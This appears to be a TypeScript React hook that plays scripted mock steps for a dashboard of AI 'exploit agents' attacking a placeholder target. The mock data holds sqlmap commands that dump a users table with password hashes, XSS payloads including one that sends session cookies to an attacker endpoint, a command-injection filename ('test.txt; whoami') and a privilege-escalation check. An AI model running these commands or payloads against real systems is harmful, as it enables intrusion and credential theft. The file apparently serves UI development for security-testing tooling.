import { useState, useEffect, useRef } from "react";
import type { ExploitAgentStep } from "../../api/agent/types";
import type { ExploitAgentData } from "../agent/queries/useExploitAgentQueries";
import { isMockDataEnabled } from "../../config";

interface AgentStepUpdate {
  agentId: string;
  agentName: string;
  newStep: ExploitAgentStep;
  delayMs: number;
  description?: string;
}

// Incremental agent step scenario
const agentStepUpdates: AgentStepUpdate[] = [
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 4000,
    description: "Agent-001 performs first step",
    newStep: {
      step_num: 1,
      reflection: "Starting SQL injection testing on login form",
      script: "sqlmap -u http://target/login --forms --batch",
      execution_output: "Testing GET parameter 'username' for SQL injection...\nParameter appears vulnerable to blind boolean-based injection"
    }
  },
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 7000,
    description: "Agent-001 adds step 2",
    newStep: {
      step_num: 2,
      reflection: "Confirmed SQL injection vulnerability. Extracting database information.",
      script: "sqlmap -u http://target/login --forms --dbs --batch",
      execution_output: "Available databases:\n[*] information_schema\n[*] mysql\n[*] webapp_db\n[*] test"
    }
  },
  {
    agentId: "agent-002",
    agentName: "XSS Detector",
    delayMs: 8000,
    description: "Agent-002 starts with first step",
    newStep: {
      step_num: 1,
      reflection: "Scanning for reflected XSS vulnerabilities in search functionality",
      script: "python3 xss_scanner.py --url http://target/search --payload-file payloads.txt",
      execution_output: "Testing search parameter with various XSS payloads...\nFound potential XSS in search parameter: <script>alert(1)</script>"
    }
  },
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 11000,
    description: "Agent-001 adds step 3",
    newStep: {
      step_num: 3,
      reflection: "Dumping user credentials from webapp_db",
      script: "sqlmap -u http://target/login --forms -D webapp_db --tables --batch",
      execution_output: "Database: webapp_db\n[3 tables]\n+----------+\n| users    |\n| sessions |\n| logs     |\n+----------+"
    }
  },
  {
    agentId: "agent-003",
    agentName: "Command Injection Finder",
    delayMs: 12000,
    description: "Agent-003 starts with first step",
    newStep: {
      step_num: 1,
      reflection: "Testing file upload functionality for command injection",
      script: "python3 command_inject.py --url http://target/upload --param filename",
      execution_output: "Testing filename parameter for command injection...\nPayload: test.txt; whoami\nResponse contains: www-data\nCommand injection vulnerability confirmed!"
    }
  },
  {
    agentId: "agent-002",
    agentName: "XSS Detector",
    delayMs: 14000,
    description: "Agent-002 adds step 2",
    newStep: {
      step_num: 2,
      reflection: "Confirming XSS vulnerability and testing for stored XSS",
      script: "curl -X POST http://target/comment -d 'comment=<img src=x onerror=alert(1)>'",
      execution_output: "Comment submitted successfully. Checking if payload persists...\nStored XSS confirmed! Payload executes on comment page."
    }
  },
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 17000,
    description: "Agent-001 adds step 4",
    newStep: {
      step_num: 4,
      reflection: "Extracting user credentials from users table",
      script: "sqlmap -u http://target/login --forms -D webapp_db -T users --dump --batch",
      execution_output: "Database: webapp_db\nTable: users\n[3 entries]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5e884898da28047151d0e56f8dc629... |\n| 2  | user1    | ef92b778bafe771e89245b89ecbc08... |\n| 3  | guest    | 098f6bcd4621d373cade4e832627b4... |\n+----+----------+----------------------------------+"
    }
  },
  {
    agentId: "agent-002",
    agentName: "XSS Detector",
    delayMs: 19000,
    description: "Agent-002 adds step 3",
    newStep: {
      step_num: 3,
      reflection: "Crafting advanced XSS payload to steal session cookies",
      script: "curl -X POST http://target/comment -d 'comment=<script>fetch(\"/steal?cookie=\"+document.cookie)</script>'",
      execution_output: "Advanced payload submitted. Session cookies will be sent to attacker-controlled endpoint when admin views comments."
    }
  },
  {
    agentId: "agent-003",
    agentName: "Command Injection Finder",
    delayMs: 20000,
    description: "Agent-003 adds step 2",
    newStep: {
      step_num: 2,
      reflection: "Attempting to escalate privileges through command injection",
      script: "curl -X POST http://target/upload -F 'file=@test.txt; sudo -l'",
      execution_output: "Executing privilege escalation check...\nUser www-data may run the following commands on target:\n(root) NOPASSWD: /usr/bin/backup.sh\nPrivilege escalation vector identified!"
    }
  }
];

export function useMockAgentSteps(): ExploitAgentData[] {
  const [agentStepsData, setAgentStepsData] = useState<ExploitAgentData[]>([]);
  const timeoutsRef = useRef<NodeJS.Timeout[]>([]);
  const hasStartedRef = useRef(false);

  useEffect(() => {
    if (!isMockDataEnabled() || hasStartedRef.current) return;

    hasStartedRef.current = true;
    console.log("[MockAgentSteps] Starting incremental agent step simulation");

    // Schedule all step updates
    agentStepUpdates.forEach((update) => {
      const timeout = setTimeout(() => {
        setAgentStepsData(currentData => {
          // Find existing agent data or create new one
          const existingAgentIndex = currentData.findIndex(data => data.agentId === update.agentId);

          if (existingAgentIndex >= 0) {
            // Add step to existing agent
            const updatedData = [...currentData];
            updatedData[existingAgentIndex] = {
              ...updatedData[existingAgentIndex],
              agentSteps: [...updatedData[existingAgentIndex].agentSteps, update.newStep]
            };

            if (update.description) {
              console.log(`[MockAgentSteps] ${update.description}`);
            }

            return updatedData;
          } else {
            // Create new agent data
            const newAgentData: ExploitAgentData = {
              agentId: update.agentId,
              agentName: update.agentName,
              agentSteps: [update.newStep]
            };

            if (update.description) {
              console.log(`[MockAgentSteps] ${update.description}`);
            }

            return [...currentData, newAgentData];
          }
        });
      }, update.delayMs);

      timeoutsRef.current.push(timeout);
    });

    // Cleanup on unmount
    return () => {
      timeoutsRef.current.forEach(timeout => clearTimeout(timeout));
      timeoutsRef.current = [];
      hasStartedRef.current = false;
    };
  }, []);

  return agentStepsData;
}
